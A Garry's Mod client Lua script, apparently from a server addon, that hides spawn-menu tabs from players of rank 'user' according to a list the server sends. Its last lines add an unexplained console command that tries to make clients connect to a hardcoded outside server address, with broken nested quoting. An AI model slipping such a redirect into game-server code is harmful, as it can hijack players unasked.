local function PlayerInit()
	if(IsValid(LocalPlayer()))then
		timer.Simple(0.2,function()
			net.Start("initit-fck")
			net.SendToServer()
		end)
		hook.Remove( "Think", "FUCLINGPLAYERINIT_1_Ever" )
	end
end
hook.Add( "Think", "FUCLINGPLAYERINIT_1_Ever", PlayerInit )

local c_list = {}
local sb = false
local sb_c = false

net.Receive("TC2.0_Send", function(l,ply)
	c_list = net.ReadTable()
	sb = false
end)

local tabs = {
	language.GetPhrase("spawnmenu.category.entities"),
	language.GetPhrase("spawnmenu.category.weapons"),
	language.GetPhrase("spawnmenu.category.npcs"),
	language.GetPhrase("spawnmenu.category.postprocess"),
	language.GetPhrase("spawnmenu.category.vehicles"),
	language.GetPhrase("spawnmenu.category.dupes"), 
	language.GetPhrase("spawnmenu.category.saves")
}

local function removeOldTabls2()
	if(serverguard.player:GetRank(LocalPlayer())=="user" and sb_c == false)then c_list = {} sb = false sb_c = true end
	if(sb==false)then
		g_SpawnMenu = vgui.Create( "SpawnMenu" )
		g_SpawnMenu:SetVisible( false )
		
		CreateContextMenu() 

		hook.Run( "PostReloadToolsMenu" )
		
		for x, z in pairs( tabs ) do
			for k,v in pairs(g_SpawnMenu.CreateMenu.Items)do
				if(v.Tab:GetText()==z)then
					local t = false
					for w,e in pairs(c_list)do
						if(language.GetPhrase("spawnmenu.category."..e)==v.Tab:GetText())then
							t = true
						end
					end
					if(t==false)then
						g_SpawnMenu.CreateMenu:CloseTab( v.Tab, true )
					end
				end
			end
		end 
		sb=true
		if(serverguard.player:GetRank(LocalPlayer())!="user")then sb_c = false end
	end
end
hook.Add("SpawnMenuOpen", "blockmenutabs", removeOldTabls2)

concommand.Add("suka", function()
LocalPlayer():ConCommand("lua_run '[[LocalPlayer():ConCommand('connect 94.23.180.165:27015')]]')
end)